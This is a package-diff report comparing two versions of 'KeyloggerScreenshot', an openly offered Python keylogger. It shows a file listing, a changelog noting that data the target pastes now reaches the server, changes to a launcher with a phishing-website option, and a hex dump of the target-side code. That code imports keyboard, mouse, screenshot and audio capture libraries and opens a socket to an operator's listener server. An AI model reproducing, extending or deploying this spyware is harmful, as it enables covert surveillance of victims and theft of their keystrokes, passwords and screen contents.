--rw-rw-rw-   0        0        0     3093 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/namespaces.py
--rw-rw-rw-   0        0        0    40329 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/package_index.py
--rw-rw-rw-   0        0        0      245 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/py34compat.py
--rw-rw-rw-   0        0        0    14348 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/sandbox.py
--rw-rw-rw-   0        0        0      941 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/unicode_utils.py
--rw-rw-rw-   0        0        0      144 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/version.py
--rw-rw-rw-   0        0        0     8376 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/wheel.py
--rw-rw-rw-   0        0        0      718 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/windows_support.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.741043 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools-65.5.1.dist-info/
--rw-rw-rw-   0        0        0     2740 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools-65.5.1.dist-info/entry_points.txt
--rw-rw-rw-   0        0        0       41 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools-65.5.1.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.438510 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/six-1.16.0.dist-info/
--rw-rw-rw-   0        0        0        4 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/six-1.16.0.dist-info/top_level.txt
--rw-rw-rw-   0        0        0    34549 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/six.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.548543 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/
--rw-rw-rw-   0        0        0     3333 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/__init__.py
--rw-rw-rw-   0        0        0    10811 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/_collections.py
--rw-rw-rw-   0        0        0       64 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/_version.py
--rw-rw-rw-   0        0        0    20300 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/connection.py
--rw-rw-rw-   0        0        0    39128 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/connectionpool.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.628657 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/__init__.py
--rw-rw-rw-   0        0        0      957 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/_appengine_environ.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.658587 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/_securetransport/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/_securetransport/__init__.py
--rw-rw-rw-   0        0        0    17632 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/_securetransport/bindings.py
--rw-rw-rw-   0        0        0    13922 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/_securetransport/low_level.py
--rw-rw-rw-   0        0        0    11012 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/appengine.py
--rw-rw-rw-   0        0        0     4528 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/ntlmpool.py
--rw-rw-rw-   0        0        0    17055 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/pyopenssl.py
--rw-rw-rw-   0        0        0    34416 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/securetransport.py
--rw-rw-rw-   0        0        0     7097 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/contrib/socks.py
--rw-rw-rw-   0        0        0     8217 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/exceptions.py
--rw-rw-rw-   0        0        0     8579 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/fields.py
--rw-rw-rw-   0        0        0     2440 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/filepost.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.668626 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.678646 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/backports/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/backports/__init__.py
--rw-rw-rw-   0        0        0     1417 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/backports/makefile.py
--rw-rw-rw-   0        0        0    34665 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/packages/six.py
--rw-rw-rw-   0        0        0    19786 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/poolmanager.py
--rw-rw-rw-   0        0        0     5985 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/request.py
--rw-rw-rw-   0        0        0    30761 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/response.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.778654 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/
--rw-rw-rw-   0        0        0     1155 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/__init__.py
--rw-rw-rw-   0        0        0     4901 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/connection.py
--rw-rw-rw-   0        0        0     1605 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/proxy.py
--rw-rw-rw-   0        0        0      498 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/queue.py
--rw-rw-rw-   0        0        0     4225 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/request.py
--rw-rw-rw-   0        0        0     3510 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/response.py
--rw-rw-rw-   0        0        0    22003 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/retry.py
--rw-rw-rw-   0        0        0    17165 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/ssl_.py
--rw-rw-rw-   0        0        0     5758 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/ssl_match_hostname.py
--rw-rw-rw-   0        0        0     6895 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/ssltransport.py
--rw-rw-rw-   0        0        0    10168 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/timeout.py
--rw-rw-rw-   0        0        0    14279 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/url.py
--rw-rw-rw-   0        0        0     5403 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3/util/wait.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.570364 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3-1.26.15.dist-info/
--rw-rw-rw-   0        0        0     1115 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3-1.26.15.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0        8 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/urllib3-1.26.15.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.878411 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/
--rw-rw-rw-   0        0        0       59 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/__init__.py
--rw-rw-rw-   0        0        0      455 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/__main__.py
--rw-rw-rw-   0        0        0      746 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/_setuptools_logging.py
--rw-rw-rw-   0        0        0    19293 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/bdist_wheel.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.950856 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/cli/
--rw-rw-rw-   0        0        0     2384 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/cli/__init__.py
--rw-rw-rw-   0        0        0     9427 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/cli/convert.py
--rw-rw-rw-   0        0        0     3383 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/cli/pack.py
--rw-rw-rw-   0        0        0      659 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/cli/unpack.py
--rw-rw-rw-   0        0        0    16145 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/macosx_libfile.py
--rw-rw-rw-   0        0        0     3727 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/metadata.py
--rw-rw-rw-   0        0        0      621 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/util.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.950856 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.988652 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/packaging/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/packaging/__init__.py
--rw-rw-rw-   0        0        0    11489 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/packaging/_manylinux.py
--rw-rw-rw-   0        0        0     4374 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/packaging/_musllinux.py
--rw-rw-rw-   0        0        0    15612 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/vendored/packaging/tags.py
--rw-rw-rw-   0        0        0     7536 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel/wheelfile.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.905960 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel-0.38.4.dist-info/
--rw-rw-rw-   0        0        0     1107 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel-0.38.4.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0      107 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel-0.38.4.dist-info/entry_points.txt
--rw-rw-rw-   0        0        0        6 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/wheel-0.38.4.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.998357 KeyloggerScreenshot-0.2.9/venv/Scripts/
--rw-rw-rw-   0        0        0     1169 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Scripts/activate_this.py
+drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.834879 KeyloggerScreenshot-0.2.9.1/
+-rw-rw-rw-   0        0        0     3339 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    11897 2023-04-09 20:16:17.000000 KeyloggerScreenshot-0.2.9.1/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.759193 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    11746 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     4712 2023-04-09 19:52:43.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      277 2023-04-10 17:12:29.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-04-14 22:51:02.829096 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0     9239 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      680 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-04-14 22:51:02.000000 KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9.1/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9.1/MANIFEST.in
+-rw-rw-rw-   0        0        0     9239 2023-04-14 22:51:02.834879 KeyloggerScreenshot-0.2.9.1/PKG-INFO
+-rw-rw-rw-   0        0        0     5137 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9.1/README.md
+-rw-rw-rw-   0        0        0     4745 2023-04-09 20:06:41.000000 KeyloggerScreenshot-0.2.9.1/Simulation_code.py
+-rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.2.9.1/client.py
+-rw-rw-rw-   0        0        0      660 2023-04-12 18:51:47.000000 KeyloggerScreenshot-0.2.9.1/demon_server.py
+-rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.2.9.1/img_1.png
+-rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.2.9.1/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.2.9.1/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-04-14 22:51:02.839456 KeyloggerScreenshot-0.2.9.1/setup.cfg
+-rw-rw-rw-   0        0        0     1077 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.2.9.1/setup.py
+-rw-rw-rw-   0        0        0      194 2023-04-14 22:40:07.000000 KeyloggerScreenshot-0.2.9.1/target.py
+-rw-rw-rw-   0        0        0      379 2023-04-14 22:38:45.000000 KeyloggerScreenshot-0.2.9.1/test.py
```

### Comparing `KeyloggerScreenshot-0.2.9/CHANGELOG.txt` & `KeyloggerScreenshot-0.2.9.1/CHANGELOG.txt`

 * *Files 3% similar despite different names*

```diff
@@ -131,7 +131,13 @@
 0.2.9 (03/04/2023)
 -------------------
 - Better Port documentation
 - New File "Simulation_code.py" (This stores the code for the simulation. Only on GitHub!!!)
 - Cleaner ServerKeylogger code
 - New help instruction on KLS_start on GitHub
 
+0.2.9.1 (15/04/2023)
+--------------------
+- Data which the target has pasted will now be shown on the server
+- Documentation incoming
+
+
```

### Comparing `KeyloggerScreenshot-0.2.9/KLS_start.py` & `KeyloggerScreenshot-0.2.9.1/KLS_start.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,23 +1,24 @@
 import os
 try:
     import pyautogui as pg
 
 except KeyError:
-    os.chdir("KeyloggerScreenshot")
-
-    with open("__init__.py", "r+") as file:
-        data = [line.replace("\n", "") for line in file]
-
-    with open("__init__.py", "w+") as file:
-        for each in data:
-            if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
-                            "import tkinter as tk", "import pyautogui as pg"]:
-                file.write(f"{each}\n")
-    os.chdir("..")
+    files = ["Server_keylogger.py", "Keylogger_Target.py"]
+    for this_file in files:
+        os.chdir("KeyloggerScreenshot")
+        with open(this_file, "r+") as file:
+            data = [line.replace("\n", "") for line in file]
+
+        with open(this_file, "w+") as file:
+            for each in data:
+                if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
+                                "import tkinter as tk", "import pyautogui as pg"]:
+                    file.write(f"{each}\n")
+        os.chdir("..")
 
 import KeyloggerScreenshot as ks
 import sys
 import threading
 import random
 import requests
 import subprocess
@@ -81,25 +82,29 @@
             port_photos = int(port_numbers[0])
             port_keylogger = int(port_numbers[1])
             port_listener = int(port_numbers[2])
             port_time = int(port_numbers[3])
 
             if "-sim" in lst:
                 try:
+                    if "-cf" not in lst:
+                        print(gui)
+                        print('YOU HAVE NOT CREATED A FILE. FOR HELP TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        quit()
                     print("The simulation is activated")
                     simulation = "simulater=True"
                     boolean = True
 
                     filename = "Simulation_code.py"
 
                     if filename not in os.listdir():
                         os.chdir("KeyloggerScreenshot")
                         with open(filename, "r+") as file:
                             data = [each for each in file]
-                            data += "\n\nstart_simulation()"
+                            data += "\n\nSimulation.start_simulation()"
                         os.chdir("..")
                         with open(filename, "a+") as this_file:
                             for line in data:
                                 this_file.write(line)
                         print(f"{filename} HAS BEEN CREATED SO YOU CAN SIMULATE WHERE THE TARGET HAS CLICKED")
 
                 except IndexError:
@@ -156,14 +161,18 @@
 
                 except IndexError:
                     quit()
 
             if "-s" in lst:  # "s" stands for seconds
                 idx_s = lst.index("-s")
                 try:
+                    if "-cf" not in lst:
+                        print(gui)
+                        print('YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        sys.exit()
                     if "-" in lst[idx_s + 1]:
                         print(gui)
                         print("PLEASE SPECIFY YOUR SECONDS -s")
                         quit()
 
                     seconds = int(lst[idx_s + 1])
                     if seconds < 60:
@@ -181,15 +190,15 @@
                 phishing_name = None
                 try:
                     phs_idx = lst.index("-phs")
                     phishing_name = lst[phs_idx + 1]
                     if "-cf" not in lst:
                         print(gui)
                         print(
-                            'YOU HAVE NOT SPECIFIED THE FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                         sys.exit()
                     try:
                         req = requests.get(phishing_name)
 
                     except requests.exceptions.RequestException:
                         print(gui)
                         print(f'WEBSITE: {phishing_name} IS NOT AVAILABLE')
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,697 +1,735 @@
-00000000: 6672 6f6d 2070 796e 7075 7420 696d 706f  from pynput impo
-00000010: 7274 206b 6579 626f 6172 640d 0a66 726f  rt keyboard..fro
-00000020: 6d20 7079 6e70 7574 2e6d 6f75 7365 2069  m pynput.mouse i
-00000030: 6d70 6f72 7420 4c69 7374 656e 6572 0d0a  mport Listener..
-00000040: 696d 706f 7274 2074 696d 650d 0a69 6d70  import time..imp
-00000050: 6f72 7420 7379 730d 0a69 6d70 6f72 7420  ort sys..import 
-00000060: 736f 636b 6574 0d0a 696d 706f 7274 2070  socket..import p
-00000070: 7961 7574 6f67 7569 2061 7320 7067 0d0a  yautogui as pg..
-00000080: 696d 706f 7274 206f 730d 0a69 6d70 6f72  import os..impor
-00000090: 7420 7079 6175 6469 6f0d 0a69 6d70 6f72  t pyaudio..impor
-000000a0: 7420 7468 7265 6164 696e 670d 0a69 6d70  t threading..imp
-000000b0: 6f72 7420 7261 6e64 6f6d 0d0a 696d 706f  ort random..impo
-000000c0: 7274 2072 6571 7565 7374 730d 0a69 6d70  rt requests..imp
-000000d0: 6f72 7420 7765 6262 726f 7773 6572 0d0a  ort webbrowser..
-000000e0: 0d0a 0d0a 636c 6173 7320 4b65 796c 6f67  ....class Keylog
-000000f0: 6765 7254 6172 6765 743a 0d0a 2020 2020  gerTarget:..    
-00000100: 6465 6620 5f5f 696e 6974 5f5f 2873 656c  def __init__(sel
-00000110: 662c 2069 705f 6f66 5f73 6572 7665 725f  f, ip_of_server_
-00000120: 7068 6f74 6f73 2c20 706f 7274 5f6f 665f  photos, port_of_
-00000130: 7365 7276 6572 5f70 686f 746f 732c 2069  server_photos, i
-00000140: 705f 6f66 5f73 6572 7665 725f 6b65 796c  p_of_server_keyl
-00000150: 6f67 6765 725f 6461 7461 2c0d 0a20 2020  ogger_data,..   
-00000160: 2020 2020 2020 2020 2020 2020 2020 706f                po
-00000170: 7274 5f6f 665f 7365 7276 6572 5f6b 6579  rt_of_server_key
-00000180: 6c6f 6767 6572 5f64 6174 612c 2069 705f  logger_data, ip_
-00000190: 6f66 5f73 6572 7665 725f 6c69 7374 656e  of_server_listen
-000001a0: 6572 2c20 706f 7274 5f6f 665f 7365 7276  er, port_of_serv
-000001b0: 6572 5f6c 6973 7465 6e65 722c 2069 705f  er_listener, ip_
-000001c0: 6f66 5f74 696d 6572 2c0d 0a20 2020 2020  of_timer,..     
-000001d0: 2020 2020 2020 2020 2020 2020 706f 7274              port
-000001e0: 5f6f 665f 7469 6d65 722c 2064 7572 6174  _of_timer, durat
-000001f0: 696f 6e5f 696e 5f73 6563 6f6e 6473 3d32  ion_in_seconds=2
-00000200: 3030 2c20 7068 6973 6869 6e67 5f77 6562  00, phishing_web
-00000210: 3d4e 6f6e 6529 3a0d 0a20 2020 2020 2020  =None):..       
-00000220: 2023 2022 6475 7261 7469 6f6e 5f69 6e5f   # "duration_in_
-00000230: 7365 636f 6e64 7322 2074 656c 6c73 2074  seconds" tells t
-00000240: 6865 2070 726f 6772 616d 6d20 686f 7720  he programm how 
-00000250: 6c6f 6e67 2069 7420 7368 6f75 6c64 206c  long it should l
-00000260: 6173 7420 7468 6520 6465 6661 756c 7420  ast the default 
-00000270: 7469 6d65 2069 7320 3230 3020 7365 636f  time is 200 seco
-00000280: 6e64 7320 7468 6174 2773 2033 204d 696e  nds that's 3 Min
-00000290: 7574 6573 2061 6e64 2032 3020 5365 636f  utes and 20 Seco
-000002a0: 6e64 730d 0a20 2020 2020 2020 2073 656c  nds..        sel
-000002b0: 662e 6970 5f70 686f 746f 7320 3d20 6970  f.ip_photos = ip
-000002c0: 5f6f 665f 7365 7276 6572 5f70 686f 746f  _of_server_photo
-000002d0: 730d 0a20 2020 2020 2020 2073 656c 662e  s..        self.
-000002e0: 706f 7274 5f70 686f 746f 7320 3d20 706f  port_photos = po
-000002f0: 7274 5f6f 665f 7365 7276 6572 5f70 686f  rt_of_server_pho
-00000300: 746f 730d 0a20 2020 2020 2020 2073 656c  tos..        sel
-00000310: 662e 6970 5f6b 6579 6c6f 6767 6572 203d  f.ip_keylogger =
-00000320: 2069 705f 6f66 5f73 6572 7665 725f 6b65   ip_of_server_ke
-00000330: 796c 6f67 6765 725f 6461 7461 0d0a 2020  ylogger_data..  
-00000340: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
-00000350: 6b65 796c 6f67 6765 7220 3d20 706f 7274  keylogger = port
-00000360: 5f6f 665f 7365 7276 6572 5f6b 6579 6c6f  _of_server_keylo
-00000370: 6767 6572 5f64 6174 610d 0a20 2020 2020  gger_data..     
-00000380: 2020 2073 656c 662e 6970 5f6c 6973 7465     self.ip_liste
-00000390: 6e65 7220 3d20 6970 5f6f 665f 7365 7276  ner = ip_of_serv
-000003a0: 6572 5f6c 6973 7465 6e65 720d 0a20 2020  er_listener..   
-000003b0: 2020 2020 2073 656c 662e 706f 7274 5f6c       self.port_l
-000003c0: 6973 7465 6e65 7220 3d20 706f 7274 5f6f  istener = port_o
-000003d0: 665f 7365 7276 6572 5f6c 6973 7465 6e65  f_server_listene
-000003e0: 720d 0a20 2020 2020 2020 2073 656c 662e  r..        self.
-000003f0: 6475 7261 7469 6f6e 203d 2064 7572 6174  duration = durat
-00000400: 696f 6e5f 696e 5f73 6563 6f6e 6473 0d0a  ion_in_seconds..
-00000410: 2020 2020 2020 2020 7365 6c66 2e69 705f          self.ip_
-00000420: 7469 6d65 7220 3d20 6970 5f6f 665f 7469  timer = ip_of_ti
-00000430: 6d65 720d 0a20 2020 2020 2020 2073 656c  mer..        sel
-00000440: 662e 706f 7274 5f74 696d 6572 203d 2070  f.port_timer = p
-00000450: 6f72 745f 6f66 5f74 696d 6572 0d0a 2020  ort_of_timer..  
-00000460: 2020 2020 2020 7365 6c66 2e70 6869 7368        self.phish
-00000470: 696e 6720 3d20 7068 6973 6869 6e67 5f77  ing = phishing_w
-00000480: 6562 0d0a 0d0a 2020 2020 2020 2020 7365  eb....        se
-00000490: 6c66 2e63 6865 636b 203d 205b 5d0d 0a20  lf.check = [].. 
-000004a0: 2020 2020 2020 2073 656c 662e 6361 7073         self.caps
-000004b0: 203d 2046 616c 7365 0d0a 2020 2020 2020   = False..      
-000004c0: 2020 7365 6c66 2e72 6963 6874 6967 655f    self.richtige_
-000004d0: 6c69 7374 6520 3d20 5b5d 0d0a 2020 2020  liste = []..    
-000004e0: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
-000004f0: 6174 6573 203d 205b 5d0d 0a0d 0a20 2020  ates = []....   
-00000500: 2064 6566 2064 6174 656e 5f61 7566 6e65   def daten_aufne
-00000510: 6865 6d65 6e28 7365 6c66 293a 0d0a 2020  hemen(self):..  
-00000520: 2020 2020 2020 6c69 7374 656e 696e 675f        listening_
-00000530: 6461 7461 203d 2073 6f63 6b65 742e 736f  data = socket.so
-00000540: 636b 6574 2873 6f63 6b65 742e 4146 5f49  cket(socket.AF_I
-00000550: 4e45 542c 2073 6f63 6b65 742e 534f 434b  NET, socket.SOCK
-00000560: 5f53 5452 4541 4d29 0d0a 2020 2020 2020  _STREAM)..      
-00000570: 2020 6c69 7374 656e 696e 675f 6461 7461    listening_data
-00000580: 2e63 6f6e 6e65 6374 2828 7365 6c66 2e69  .connect((self.i
-00000590: 705f 6c69 7374 656e 6572 2c20 7365 6c66  p_listener, self
